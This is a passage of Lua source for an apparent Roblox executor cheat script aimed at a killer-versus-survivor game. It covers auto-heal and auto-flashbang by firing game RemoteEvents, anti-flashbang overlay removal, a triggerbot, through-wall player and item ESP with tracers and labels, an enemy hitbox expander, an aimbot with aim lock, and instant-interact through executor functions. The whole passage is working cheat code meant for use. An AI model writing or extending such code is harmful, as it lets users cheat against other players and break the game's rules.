                if not child:IsA("Tool") then return end
                if child.Name:upper() ~= "BITE" then return end
                if cfg.BiteEnabled and not biteSwingConn then
                    task.wait(0.3)
                    _sBiteA()
                end
            end)
        end
        _hookZMBiteWatch(getCharacter())
        LocalPlayer.CharacterAdded:Connect(function(ch)
            _xBiteA()
            if cfg.BiteEnabled then task.wait(0.5); _sBiteA() end
            task.wait(0.5)
            _hookZMBiteWatch(ch)
        end)
    end

    -- ── Auto Bandage ──────────────────────────────────────────────────────
    local startAutoBandage, stopAutoBandage
    stopAutoBandage = function()
        if _AUTO.bandageConn then _AUTO.bandageConn:Disconnect(); _AUTO.bandageConn = nil end
    end
    startAutoBandage = function()
        stopAutoBandage()
        local healCooldown = false
        local HEAL_NAMES = {"bandage","medkit","medic","heal","first","wrap","gauze","kit","aid"}
        local function isBandageTool(tool)
            local n = tool.Name:lower()
            for _, kw in ipairs(HEAL_NAMES) do if n:find(kw) then return true end end
            return false
        end
        local function findBandage(ch)
            if ch then
                for _, v in ipairs(ch:GetChildren()) do
                    if v:IsA("Tool") and isBandageTool(v) then return v end
                end
            end
            local bp = LocalPlayer:FindFirstChildOfClass("Backpack")
            if bp then
                for _, v in ipairs(bp:GetChildren()) do
                    if v:IsA("Tool") and isBandageTool(v) then return v end
                end
            end
            return nil
        end
        local function fireUse(tool)
            if not tool or not tool.Parent then return false end
            for _, d in ipairs(tool:GetDescendants()) do
                if d:IsA("RemoteEvent") then
                    local n = d.Name:lower()
                    if n == "use" or n:find("use") or n:find("heal") or n:find("bandage") or n:find("apply") then
                        pcall(function() d:FireServer() end); return true
                    end
                end
            end
            for _, d in ipairs(tool:GetDescendants()) do
                if d:IsA("RemoteEvent") then pcall(function() d:FireServer() end); return true end
            end
            local ch3 = getCharacter()
            if ch3 and tool.Parent == ch3 then
                local cam = workspace.CurrentCamera
                local mid = Vector2.new(cam.ViewportSize.X/2, cam.ViewportSize.Y/2)
                pcall(function() VirtualUser:Button1Down(mid, cam.CFrame) end)
                task.wait(0.1)
                pcall(function() VirtualUser:Button1Up(mid, cam.CFrame) end)
                return true
            end
            return false
        end
        _AUTO.bandageConn = RunService.Heartbeat:Connect(function()
            if not cfg.AutoBandageEnabled then stopAutoBandage(); return end
            if healCooldown then return end
            local ch  = getCharacter()
            local hum = ch and ch:FindFirstChildOfClass("Humanoid")
            if not hum or hum.Health <= 0 or hum.Health >= _AUTO.BANDAGE_HP then return end
            local bandage = findBandage(ch)
            if not bandage then return end
            healCooldown = true
            task.spawn(function()
                if ch and bandage.Parent ~= ch then
                    local bHum = ch:FindFirstChildOfClass("Humanoid")
                    if bHum then pcall(function() bHum:EquipTool(bandage) end); task.wait(0.08) end
                end
                local equipped = findBandage(ch) or bandage
                fireUse(equipped)
                task.wait(4.0)
                local ch2  = getCharacter()
                local hum2 = ch2 and ch2:FindFirstChildOfClass("Humanoid")
                if hum2 and hum2.Health > 0 and hum2.Health < _AUTO.BANDAGE_HP then
                    local b2 = findBandage(ch2)
                    if b2 then
                        if b2.Parent ~= ch2 then
                            local bh = ch2:FindFirstChildOfClass("Humanoid")
                            if bh then pcall(function() bh:EquipTool(b2) end); task.wait(0.08) end
                        end
                        fireUse(findBandage(ch2) or b2)
                        task.wait(4.0)
                    end
                end
                healCooldown = false
            end)
        end)
    end

    -- ── Auto Flashbang ────────────────────────────────────────────────────
    local isPlayerOnKillerTeamLocal
    do
        local _v4killerTeam = function(p)
            if not p or not p.Team then return false end
            local t = p.Team.Name:lower()
            return t == "killers" or t == "killer"
        end
        isPlayerOnKillerTeamLocal = _v4killerTeam
    end

    local startAutoFlash, stopAutoFlash
    stopAutoFlash = function()
        if _AUTO.flashConn then _AUTO.flashConn:Disconnect(); _AUTO.flashConn = nil end
    end
    startAutoFlash = function()
        stopAutoFlash()
        local flashCooldown = false
        local function isFlash(tool)
            local n = tool.Name:lower()
            return n:find("flash") or n:find("grenade") or n:find("bang")
        end
        local function findFlash(ch)
            if ch then
                for _, v in ipairs(ch:GetChildren()) do
                    if v:IsA("Tool") and isFlash(v) then return v end
                end
            end
            local bp = LocalPlayer:FindFirstChildOfClass("Backpack")
            if bp then
                for _, v in ipairs(bp:GetChildren()) do
                    if v:IsA("Tool") and isFlash(v) then return v end
                end
            end
            return nil
        end
        _AUTO.flashConn = RunService.Heartbeat:Connect(function()
            if not cfg.AutoFlashEnabled then stopAutoFlash(); return end
            if flashCooldown then return end
            local ch    = getCharacter()
            local myHRP = ch and ch:FindFirstChild("HumanoidRootPart")
            if not myHRP then return end
            local nearestKiller, nearestDist = nil, math.huge
            for _, p in ipairs(Players:GetPlayers()) do
                if p ~= LocalPlayer and isPlayerOnKillerTeamLocal(p) and p.Character then
                    local hrp = p.Character:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        local d = (hrp.Position - myHRP.Position).Magnitude
                        if d < nearestDist then nearestKiller = p; nearestDist = d end
                    end
                end
            end
            if not nearestKiller or nearestDist > _AUTO.FLASH_RANGE then return end
            local flash = findFlash(ch)
            if not flash then return end
            flashCooldown = true
            task.spawn(function()
                if ch and flash.Parent ~= ch then
                    local bHum = ch:FindFirstChildOfClass("Humanoid")
                    if bHum then
                        flash.Parent = ch
                        pcall(function() bHum:EquipTool(flash) end)
                        task.wait(0.12)
                    end
                end
                if nearestKiller and nearestKiller.Character then
                    local kHRP = nearestKiller.Character:FindFirstChild("HumanoidRootPart")
                    if kHRP then
                        local cam = workspace.CurrentCamera
                        local sp, onScreen = cam:WorldToViewportPoint(kHRP.Position)
                        local clickPos = (onScreen and sp.Z > 0)
                            and Vector2.new(sp.X, sp.Y)
                            or  Vector2.new(cam.ViewportSize.X/2, cam.ViewportSize.Y/2)
                        pcall(function() VirtualUser:Button1Down(clickPos, cam.CFrame) end)
                        task.wait(0.1)
                        pcall(function() VirtualUser:Button1Up(clickPos, cam.CFrame) end)
                    end
                end
                task.wait(8)
                flashCooldown = false
            end)
        end)
    end

    -- ── Anti-Flashbang ────────────────────────────────────────────────────
    local applyDisableFlash
    applyDisableFlash = function(enabled)
        local function isFlashElement(desc)
            local n = (desc.Name or ""):lower()
            if n:find("flash") or n:find("blind") or n:find("bang") or n:find("white") or n:find("bright") then
                return true
            end
            if desc:IsA("Frame") or desc:IsA("ImageLabel") then
                local c = desc.BackgroundColor3
                if c and c.R > 0.85 and c.G > 0.85 and c.B > 0.85 then
                    if desc.BackgroundTransparency < 0.5 then return true end
                end
            end
            return false
        end
        local function patchGui(gui)
            if not gui then return end
            for _, desc in ipairs(gui:GetDescendants()) do
                if isFlashElement(desc) then
                    if desc:IsA("Frame") or desc:IsA("ImageLabel") then
                        pcall(function()
                            if enabled then
                                if not desc:GetAttribute("_fOrig") then
                                    desc:SetAttribute("_fOrig", desc.BackgroundTransparency)
                                end
                                desc.BackgroundTransparency = 1
                            else
                                local orig = desc:GetAttribute("_fOrig")
                                if orig then
                                    desc.BackgroundTransparency = orig
                                    desc:SetAttribute("_fOrig", nil)
                                end
                            end
                        end)
                    end
                end
            end
        end
        local pg = LocalPlayer:FindFirstChildOfClass("PlayerGui")
        if pg then
            for _, gui in ipairs(pg:GetChildren()) do
                pcall(patchGui, gui)
            end
            pg.DescendantAdded:Connect(function(desc)
                if not cfg.DisableFlashEnabled then return end
                task.wait(0.05)
                if isFlashElement(desc) and (desc:IsA("Frame") or desc:IsA("ImageLabel")) then
                    pcall(function() desc.BackgroundTransparency = 1 end)
                end
            end)
        end
    end

    -- ── TriggerBot ────────────────────────────────────────────────────────
    local _tbMouse = LocalPlayer:GetMouse()
    local _tbTimer = 0
    RunService.RenderStepped:Connect(function(dt)
        if not cfg.TriggerBotEnabled then return end
        _tbTimer = _tbTimer + dt
        if _tbTimer < _AUTO.TRIGGER_RATE then return end
        _tbTimer = 0
        if _tbMouse.Target and _tbMouse.Target.Parent:FindFirstChild("Humanoid") then
            -- Team check: skip firing if target is on the same team
            if cfg.TB_TeamCheck then
                local tbPlr = Players:GetPlayerFromCharacter(_tbMouse.Target.Parent)
                if tbPlr and tbPlr.Team and LocalPlayer.Team and tbPlr.Team == LocalPlayer.Team then
                    return
                end
            end
            pcall(function() mouse1press() end)
            wait(0.1)
            pcall(function() mouse1release() end)
        end
    end)
    -- ════════════════════════════════════════════════════════════
    -- END OF PLAYER TAB FUNCTIONS
    -- ════════════════════════════════════════════════════════════


    -- ════════════════════════════════════════════════════════════
    -- ESP / HITBOX TAB FUNCTIONS
    -- ════════════════════════════════════════════════════════════

    -- ── Helpers ───────────────────────────────────────────────────────────
    local function _espIsKiller(p)
        if not p or not p.Team then return false end
        local t = p.Team.Name:lower()
        return t == "killers" or t == "killer"
    end
    local function _espTeamColor(teamName, plr)
        if not teamName then
            if plr and plr.Team and plr.Team.TeamColor then return plr.Team.TeamColor.Color end
            return Color3.fromRGB(200,200,200)
        end
        local t = teamName:lower()
        if t == "killers"   or t == "killer"    then return cfg.ESPColorKiller   end
        if t == "survivors" or t == "survivor"  then return cfg.ESPColorSurvivor end
        if t == "spectators"or t == "spectator" then return cfg.ESPColorSpectator end
        -- Unknown team: use Roblox's actual team colour
        if plr and plr.Team and plr.Team.TeamColor then return plr.Team.TeamColor.Color end
        return Color3.fromRGB(200,200,200)
    end
    local function _espPlayerColor(plr)
        local myTeam  = LocalPlayer.Team
        local plrTeam = plr.Team
        if myTeam and plrTeam and myTeam == plrTeam then
            -- When ShowTeammates is OFF, use the hardcoded team color (like Viewer tab)
            -- instead of the purple teammate color, so teammates are visually distinguishable
            if not cfg.ShowTeammates then
                local tName = plrTeam and plrTeam.Name or "Unknown"
                return _espTeamColor(tName, plr), tName
            end
            return cfg.ESPColorTeammate, myTeam.Name .. " (squad)"
        end
        local tName = plrTeam and plrTeam.Name or "Unknown"
        return _espTeamColor(tName, plr), tName
    end
    local function _espGetItemsFolder()
        local map1 = workspace:FindFirstChild("Map")
        if not map1 then return nil end
        local map2 = map1:FindFirstChild("Map")
        if map2 then
            local items = map2:FindFirstChild("Items")
            if items then return items end
            return map2
        end
        local direct2 = map1:FindFirstChild("Items")
        if direct2 then return direct2 end
        local direct = workspace:FindFirstChild("Items")
        if direct then return direct end
        return nil
    end
    local function _espItemColor(name)
        if name:find("Bandage",      1, true) then return cfg.ESPColorBandage         end
        if name:find("Bear Trap",    1, true) then return cfg.ESPColorBearTrap        end
        if name:find("Bear trap",    1, true) then return cfg.ESPColorPlacedBearTrap  end
        if name:find("Bloxy Cola",   1, true) then return cfg.ESPColorBloxyCola       end
        if name:find("Metal Pipe",   1, true) then return cfg.ESPColorMetalPipe       end
        if name:find("Pepper Spray", 1, true) then return cfg.ESPColorPepper          end
        return cfg.ESPColorItem
    end
    -- ── ESP data tables ───────────────────────────────────────────────────
    local espData, itemESPData = {}, {}

    local function cleanupPlayerESP(plr)
        local d = espData[plr]
        if not d then return end
        pcall(function() if d.highlight then d.highlight:Destroy() end end)
        pcall(function() if d.tracer    then d.tracer:Remove()     end end)
        espData[plr] = nil
    end
    Players.PlayerRemoving:Connect(cleanupPlayerESP)

    -- ── Chams + Boxes (unified single Highlight per player) ──────────────
    -- Roblox only renders ONE Highlight per adornee at a time regardless of
    -- parent container. Both chams and boxes share d.highlight.
    -- Chams only  -> fill coloured, outline coloured
    -- Boxes only  -> FillTransparency=1 (outline-only), outline coloured
    -- Both        -> chams fill + outline (same highlight, fully compatible)
    -- Neither     -> Highlight disabled
    local function _uCH_BX()
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr == LocalPlayer then continue end
            espData[plr] = espData[plr] or {}
            local d = espData[plr]
            local isTeammate  = LocalPlayer.Team and plr.Team and LocalPlayer.Team == plr.Team
            local isKillerPlr = _espIsKiller(plr)

            -- when showteammates is off, teammates are still shown but with their
            -- hardcoded team color (handled by _espPlayerColor). only killeresponly
            -- can fully exclude non-killers.
            local filterOut = (cfg.KillerESPOnly and not isKillerPlr)

            local wantChams = cfg.ESPEnabled and cfg.ESPChams and plr.Character ~= nil and not filterOut
            local wantBoxes = cfg.ESPEnabled and cfg.ESPOutlines and plr.Character ~= nil and not filterOut

            if wantChams or wantBoxes then
                if not d.highlight or not d.highlight.Parent then
                    local hl               = Instance.new("Highlight")
                    hl.Name                = "MP_ESP"
                    hl.DepthMode           = Enum.HighlightDepthMode.AlwaysOnTop
                    hl.Parent              = PlayerGui
                    d.highlight            = hl
                end
                local col = isKillerPlr and cfg.ESPColorKiller or (_espPlayerColor(plr))
                d.highlight.Adornee          = plr.Character
                d.highlight.DepthMode        = Enum.HighlightDepthMode.AlwaysOnTop
                d.highlight.OutlineColor     = col
                d.highlight.OutlineTransparency = 0
                if wantChams then
                    d.highlight.FillColor        = col
                    d.highlight.FillTransparency = isKillerPlr and 0.25 or 0.45
                else
                    -- Boxes only — outline visible, no fill
                    d.highlight.FillTransparency = 1
                end
                d.highlight.Enabled = true
            else
                if d.highlight then d.highlight.Enabled = false end
            end
        end
    end
    local function _uCH() _uCH_BX() end
    local function _uBX() end  -- boxes handled inside _uCH_BX; no-op to keep render loop intact

    -- ── Tracers (_uTR) ────────────────────────────────────────────────────
    local function _uTR()
        local bottom = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y)
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr == LocalPlayer then continue end
            espData[plr] = espData[plr] or {}
            local d = espData[plr]
            if not d.tracer then
                d.tracer             = Drawing.new("Line")
                d.tracer.Thickness   = 1.5
                d.tracer.Color       = Color3.fromRGB(0, 220, 100)
                d.tracer.Transparency = 1
                d.tracer.Visible     = false
            end
            local skipTr = (cfg.KillerESPOnly and not _espIsKiller(plr))
            if cfg.ESPEnabled and cfg.ESPTracers and plr.Character and not skipTr then
                local col, _ = _espPlayerColor(plr)
                d.tracer.Color = col
                local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
                if hrp then
                    local hum  = plr.Character:FindFirstChildOfClass("Humanoid")
                    local feet = hrp.Position - Vector3.new(0, hum and hum.HipHeight or 1.5, 0)
                    local sc, on = Camera:WorldToViewportPoint(feet)
                    if on and sc.Z > 0 then
                        d.tracer.From    = bottom
                        d.tracer.To      = Vector2.new(sc.X, sc.Y)
                        d.tracer.Visible = true
                    else d.tracer.Visible = false end
                else d.tracer.Visible = false end
            else d.tracer.Visible = false end
        end
    end

    -- ── Player Labels (_uLB) ─────────────────────────────────────────────
    local function _uLB()
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr == LocalPlayer then continue end
            espData[plr] = espData[plr] or {}
            local d = espData[plr]
            local skipLb = (cfg.KillerESPOnly and not _espIsKiller(plr))
            if cfg.ESPEnabled and cfg.PlayerLabels and plr.Character and not skipLb then
                -- create billboard if needed, or if it belongs to an old/destroyed character
                local stale = not d.labelBillboard
                    or not d.labelBillboard.Parent
                    or d.labelBillboard.Parent ~= plr.Character
                if stale then
                    if d.labelBillboard then pcall(function() d.labelBillboard:Destroy() end) end
                    d.labelBillboard = nil
                    d.labelText = nil
                    local head = plr.Character:FindFirstChild("Head")
                    if not head then continue end
                    local bb = Instance.new("BillboardGui")
                    bb.Name = "MP_LBL"
                    bb.Adornee = head
                    bb.Size = UDim2.new(0, 200, 0, 50)
                    bb.StudsOffset = Vector3.new(0, 2, 0)
                    bb.AlwaysOnTop = true
                    bb.MaxDistance = 0
                    bb.Parent = plr.Character
                    local lbl = Instance.new("TextLabel", bb)
                    lbl.Size = UDim2.new(1, 0, 1, 0)
                    lbl.BackgroundTransparency = 1
                    lbl.Font = Enum.Font.GothamBold
                    lbl.TextSize = cfg.PlayerLabelSize
                    lbl.TextStrokeTransparency = 0.5
                    lbl.RichText = true
                    lbl.Text = "..."
                    d.labelBillboard = bb
                    d.labelText = lbl
                end
                -- update color and text
                if d.labelText and d.labelText.Parent then
                    local col = _espPlayerColor(plr)
                    d.labelText.TextColor3 = col
                    d.labelText.TextSize = cfg.PlayerLabelSize
                    local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
                    local hum = plr.Character:FindFirstChildOfClass("Humanoid")
                    local myHrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                    if hrp and hum and myHrp then
                        local dist = (hrp.Position - myHrp.Position).Magnitude
                        local hp   = math.floor(hum.Health)
                        local maxHp = math.floor(hum.MaxHealth)
                        local team = plr.Team and plr.Team.Name or "No Team"
                        -- health colour: green -> yellow -> red based on pct
                        local pct = maxHp > 0 and math.clamp(hp / maxHp, 0, 1) or 0
                        local hr = math.floor(math.clamp(2 * (1 - pct), 0, 1) * 255)
                        local hg = math.floor(math.clamp(2 * pct,       0, 1) * 255)
                        local hpHex = string.format("#%02X%02X%02X", hr, hg, 40)
                        local hpStr = string.format("<font color=\"%s\">%d/%d HP</font>", hpHex, hp, maxHp)
                        if plr.Name == plr.DisplayName then
                            d.labelText.Text = string.format("%s | %.1fm | %s | @%s", team, dist, hpStr, plr.Name)
                        else
                            d.labelText.Text = string.format("%s | %.1fm | %s | %s (@%s)", team, dist, hpStr, plr.DisplayName, plr.Name)
                        end
                    end
                    d.labelBillboard.Enabled = true
                end
            else
                -- hide if disabled
                if d.labelBillboard then
                    d.labelBillboard.Enabled = false
                end
            end
        end
    end

    -- ── Item ESP (_uIE) ───────────────────────────────────────────────────
    local function _uIE()
        local folder = _espGetItemsFolder()
        if not cfg.ItemESPEnabled or not folder then
            for _, d in pairs(itemESPData) do
                if d.label  then d.label.Visible  = false end
                if d.tracer then d.tracer.Visible = false end
                if d.chams  then pcall(function() d.chams.Enabled = false end) end
            end
            return
        end
        local seen = {}
        local wsItemsFolder = workspace:FindFirstChild("Items")  -- lobby folder, not map
        for _, item in ipairs(folder:GetChildren()) do
            -- skip items that have been moved to workspace.Items (picked up / in lobby)
            if wsItemsFolder and item.Parent == wsItemsFolder then continue end
            local part = nil
            if item:IsA("BasePart") then
                part = item
            elseif item:IsA("Model") then
                part = item.PrimaryPart or item:FindFirstChildWhichIsA("BasePart")
            end
            if part then
                seen[item] = true
                if not itemESPData[item] then
                    local lbl        = Drawing.new("Text")
                    lbl.Size         = 14
                    lbl.Font         = Drawing.Fonts.UI
                    lbl.Color        = _espItemColor(item.Name)
                    lbl.Outline      = true
                    lbl.OutlineColor = Color3.fromRGB(0, 0, 0)
                    lbl.Visible      = false
                    lbl.Center       = true
                    local tr         = Drawing.new("Line")
                    tr.Thickness     = 1
                    tr.Color         = _espItemColor(item.Name)
                    tr.Transparency  = 1
                    tr.Visible       = false
                    local hl = nil
                    pcall(function()
                        hl = Instance.new("Highlight")
                        hl.FillColor           = _espItemColor(item.Name)
                        hl.FillTransparency    = 0.5
                        hl.OutlineColor        = _espItemColor(item.Name)
                        hl.OutlineTransparency = 0
                        hl.DepthMode           = Enum.HighlightDepthMode.AlwaysOnTop
                        hl.Adornee             = item   -- whole model/part so all meshes glow
                        hl.Parent              = workspace.CurrentCamera
                    end)
                    itemESPData[item] = { label = lbl, tracer = tr, chams = hl }
                end
                local pickedUp = (not item.Parent) or (item.Parent ~= folder)
                local hidden   = part.Transparency >= 1  -- item is invisible = picked up / held
                local d = itemESPData[item]
                if pickedUp then
                    d.label.Visible  = false
                    d.tracer.Visible = false
                    if d.chams then pcall(function() d.chams.Enabled = false end) end
                    seen[item] = nil
                elseif hidden then
                    d.label.Visible  = false
                    d.tracer.Visible = false
                    if d.chams then pcall(function() d.chams.Enabled = false end) end
                else
                    local sc, onScreen = Camera:WorldToViewportPoint(part.Position)
                    if onScreen and sc.Z > 0 then
                        local myHRP  = getHRP()
                        local dist   = myHRP and math.floor((myHRP.Position - part.Position).Magnitude) or 0
                        d.label.Text     = item.Name .. "  [" .. dist .. "m]"
                        d.label.Color    = _espItemColor(item.Name)
                        d.label.Position = Vector2.new(sc.X, sc.Y - 18)
                        d.label.Visible  = cfg.ItemESPLabels
                        d.tracer.From    = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y)
                        d.tracer.To      = Vector2.new(sc.X, sc.Y)
                        d.tracer.Color   = _espItemColor(item.Name)
                        d.tracer.Visible = cfg.ItemESPTracers
                        if d.chams then
                            pcall(function()
                                local show = cfg.ItemChamsEnabled and cfg.ItemESPEnabled
                                d.chams.Enabled      = show
                                d.chams.FillColor    = _espItemColor(item.Name)
                                d.chams.OutlineColor = _espItemColor(item.Name)
                            end)
                        end
                    else
                        d.label.Visible  = false
                        d.tracer.Visible = false
                        if d.chams then pcall(function() d.chams.Enabled = false end) end
                    end
                end
            end
        end
        for inst, d in pairs(itemESPData) do
            if not seen[inst] then
                pcall(function() d.label.Visible = false; d.label:Remove()  end)
                pcall(function() d.tracer.Visible = false; d.tracer:Remove() end)
                pcall(function()
                    if d.chams then
                        d.chams.Adornee = nil
                        d.chams.Enabled = false
                        d.chams:Destroy()
                    end
                end)
                itemESPData[inst] = nil
            end
        end
    end

    -- Instant hide when an item leaves the folder (picked up), no waiting for next heartbeat
    local function _cleanupItemESP(inst)
        local d = itemESPData[inst]
        if not d then return end
        pcall(function() d.label.Visible = false; d.label:Remove()  end)
        pcall(function() d.tracer.Visible = false; d.tracer:Remove() end)
        pcall(function()
            if d.chams then
                d.chams.Adornee = nil
                d.chams.Enabled = false
                d.chams:Destroy()
            end
        end)
        itemESPData[inst] = nil
    end

    local _itemFolderConn = nil
    local function _hookItemFolder()
        if _itemFolderConn then _itemFolderConn:Disconnect(); _itemFolderConn = nil end
        local folder = _espGetItemsFolder()
        if not folder then return end
        _itemFolderConn = folder.ChildRemoved:Connect(_cleanupItemESP)
    end
    _hookItemFolder()
    workspace.DescendantAdded:Connect(function(desc)
        if desc.Name == "Items" then task.defer(_hookItemFolder) end
    end)

    -- ── Hitbox (Heartbeat) ────────────────────────────────────────────────
    local hitboxOriginals = {}
    RunService.Heartbeat:Connect(function()
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr == LocalPlayer then continue end
            local ch  = plr.Character
            local hrp = ch and ch:FindFirstChild("HumanoidRootPart")
            if not hrp then continue end
            local myTeam  = LocalPlayer.Team
            local plrTeam = plr.Team
            local isEnemy = not (myTeam and plrTeam and myTeam == plrTeam)
            if isEnemy and cfg.HitboxEnabled then
                if not hitboxOriginals[plr] then
                    hitboxOriginals[plr] = hrp.Size
                end
                local s = cfg.HitboxSize
                pcall(function() hrp.Size = Vector3.new(s, s, s) end)
            else
                if hitboxOriginals[plr] then
                    pcall(function() hrp.Size = hitboxOriginals[plr] end)
                    hitboxOriginals[plr] = nil
                end
            end
        end
    end)
    Players.PlayerRemoving:Connect(function(plr) hitboxOriginals[plr] = nil end)

    -- ── Main ESP render loop ──────────────────────────────────────────────
    RunService.Heartbeat:Connect(function()
        pcall(function()
            _uCH(); _uBX(); _uTR(); _uLB(); _uIE()
        end)
    end)

    -- ── Bear Trap ESP ─────────────────────────────────────────────────────
    local function isTrapName(name)
        local n = name:lower()
        return n:find("beartrap") or n:find("bear trap") or (n:find("bear") and n:find("trap"))
    end

    local function hasProximityPrompt(item)
        if item:FindFirstChildWhichIsA("ProximityPrompt") then return true end
        if item:IsA("Model") then
            for _, child in ipairs(item:GetDescendants()) do
                if child:IsA("ProximityPrompt") then return true end
            end
        end
        return false
    end

    local function makeTrapHL(item)
        if _AUTO.bearTrapHighlights[item] then return end
        if hasProximityPrompt(item) then return end
        local adornee = item
        if item:IsA("Model") then
            adornee = item.PrimaryPart or item:FindFirstChildWhichIsA("BasePart")
        end
        if not adornee then return end
        local hl = Instance.new("Highlight")
        hl.FillColor           = cfg.ESPColorPlacedBearTrap
        hl.FillTransparency    = 0.5
        hl.OutlineColor        = cfg.ESPColorPlacedBearTrap
        hl.OutlineTransparency = 0
        hl.DepthMode           = Enum.HighlightDepthMode.AlwaysOnTop
        hl.Adornee             = adornee
        hl.Parent              = workspace
        _AUTO.bearTrapHighlights[item] = hl
    end

    local scanTrapsOnce
    scanTrapsOnce = function(root, depth)
        depth = depth or 0
        if depth > 10 then return end
        for _, item in ipairs(root:GetChildren()) do
            if isTrapName(item.Name) then
                makeTrapHL(item)
            elseif item:IsA("Folder") or item:IsA("Model") then
                scanTrapsOnce(item, depth + 1)
            end
        end
    end

    local function updateBearTrapESP()
        for inst, hl in pairs(_AUTO.bearTrapHighlights) do
            if not inst or not inst.Parent then
                pcall(function() hl:Destroy() end)
                _AUTO.bearTrapHighlights[inst] = nil
            end
        end
        if not cfg.BearTrapESP then
            for _, hl in pairs(_AUTO.bearTrapHighlights) do
                pcall(function() if hl and hl.Parent then hl.Parent = nil end end)
            end
            return
        end
        -- Re-check existing highlights in case a ProximityPrompt was added/removed
        for item, hl in pairs(_AUTO.bearTrapHighlights) do
            if item and item.Parent then
                if hasProximityPrompt(item) then
                    pcall(function() hl:Destroy() end)
                    _AUTO.bearTrapHighlights[item] = nil
                else
                    pcall(function()
                        if not hl.Parent then hl.Parent = workspace end
                        local adornee = item:IsA("Model") and (item.PrimaryPart or item:FindFirstChildWhichIsA("BasePart")) or item
                        pcall(function() hl.Adornee = adornee end)
                    end)
                end
            end
        end
    end

    workspace.DescendantAdded:Connect(function(desc)
        if cfg.BearTrapESP and isTrapName(desc.Name) then
            task.wait(0.05)
            makeTrapHL(desc)
        end
        -- If a ProximityPrompt is added to a tracked trap, remove its highlight
        if desc:IsA("ProximityPrompt") then
            local parent = desc.Parent
            if parent and _AUTO.bearTrapHighlights[parent] then
                local hl = _AUTO.bearTrapHighlights[parent]
                pcall(function() hl:Destroy() end)
                _AUTO.bearTrapHighlights[parent] = nil
            end
        end
    end)

    -- ════════════════════════════════════════════════════════════
    -- END OF ESP / HITBOX FUNCTIONS
    -- ════════════════════════════════════════════════════════════


    -- ════════════════════════════════════════════════════════════
    -- AIMBOT / FOV TAB FUNCTIONS
    -- ════════════════════════════════════════════════════════════

    -- ── FOV circle Drawing ────────────────────────────────────────────────
    local fovCircle    = Drawing.new("Circle")
    fovCircle.Visible      = false
    fovCircle.Radius       = cfg.FOV
    fovCircle.Color        = cfg.AimbotColorFOV
    fovCircle.Thickness    = 1.5
    fovCircle.Filled       = false
    fovCircle.Transparency = 1

    -- Updates FOV circle position, radius, color, and visibility each frame
    local function _uFC()
        fovCircle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
        fovCircle.Radius   = cfg.FOV
        fovCircle.Color    = cfg.AimbotColorFOV
        fovCircle.Visible  = cfg.AimbotEnabled and cfg.FOVCircleEnabled
    end

    -- Returns the Head closest to screen center within cfg.FOV radius (for aimbot lerp)
    local function _gAT()
        local cx, cy = Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2
        local best, bestDist = nil, cfg.FOV
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character then
                if cfg.AimbotTeamCheck and LocalPlayer.Team and plr.Team and LocalPlayer.Team == plr.Team then continue end
                local head = plr.Character:FindFirstChild("Head")
                if head then
                    local pos, onScreen = Camera:WorldToViewportPoint(head.Position)
                    if onScreen and pos.Z > 0 then
                        if cfg.AimbotVisibleCheck then
                            local origin = Camera.CFrame.Position
                            local dir = (head.Position - origin)
                            local ray = Ray.new(origin, dir)
                            local ignore = {LocalPlayer.Character, plr.Character}
                            local hit = workspace:FindPartOnRayWithIgnoreList(ray, ignore)
                            if hit then continue end
                        end
                        local dist = (Vector2.new(pos.X, pos.Y) - Vector2.new(cx, cy)).Magnitude
                        if dist < bestDist then bestDist = dist; best = head end
                    end
                end
            end
        end
        return best
    end

    -- Returns the nearest enemy Head by world distance (for aim lock snap)
    local function _gAL()
        local bestDist, bestHead = math.huge, nil
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr == LocalPlayer then continue end
            local myTeam  = LocalPlayer.Team
            local plrTeam = plr.Team
            local isEnemy = not (myTeam and plrTeam and myTeam == plrTeam)
            if not isEnemy then continue end
            local ch   = plr.Character
            local head = ch and ch:FindFirstChild("Head")
            if not head then continue end
            local dist = (head.Position - Camera.CFrame.Position).Magnitude
            if dist < bestDist then bestDist = dist; bestHead = head end
        end
        return bestHead
    end

    -- Aim Lock: snaps camera to nearest enemy head every RenderStepped
    RunService.RenderStepped:Connect(function()
        pcall(function()
            if not cfg.AimLockEnabled then return end
            local target = _gAL()
            if not target then return end
            local pos = Camera.CFrame.Position
            Camera.CFrame = CFrame.new(pos, target.Position)
        end)
    end)

    -- Aimbot + FOV circle: smooth lerp camera toward nearest head in FOV
    RunService:BindToRenderStep("_MP_Aimbot", Enum.RenderPriority.Camera.Value + 1, function(dt)
        pcall(function()
            _uFC()
            if not cfg.AimbotEnabled then return end
            local target = _gAT()
            if not target then return end
            local cur = Camera.CFrame
            local a   = 1 - (1 - math.clamp(cfg.Smoothness, 0.01, 1)) ^ (dt * 60)
            Camera.CFrame = cur:Lerp(CFrame.new(cur.Position, target.Position), a)
        end)
    end)

    -- ════════════════════════════════════════════════════════════
    -- END OF AIMBOT / FOV FUNCTIONS
    -- ════════════════════════════════════════════════════════════


    -- ════════════════════════════════════════════════════════════
    -- QUEST TAB FUNCTIONS
    -- ════════════════════════════════════════════════════════════

    -- ── Instant Interact ──────────────────────────────────────────────────
    local _promptConn = nil
    local function applyInstantPrompts(enabled)
        if enabled then
            if _promptConn then _promptConn:Disconnect(); _promptConn = nil end
            if not fireproximityprompt then
                UILib.notify("Instant Interact", "Your executor does not support fireproximityprompt.", 4)
                return
            end
            _promptConn = game:GetService("ProximityPromptService").PromptButtonHoldBegan:Connect(function(prompt)
                pcall(function() fireproximityprompt(prompt) end)
            end)
        else
            if _promptConn then _promptConn:Disconnect(); _promptConn = nil end
        end
    end

    -- Quest name -> folder child name lookup table for fuzzy matching
    local QUEST_NAME_MAP = {
        ["lock"] = "LockDoor",   ["door"]     = "LockDoor",
        ["piano"] = "Piano",
        ["sunbath"] = "Sunbathing", ["pool"]  = "Sunbathing",
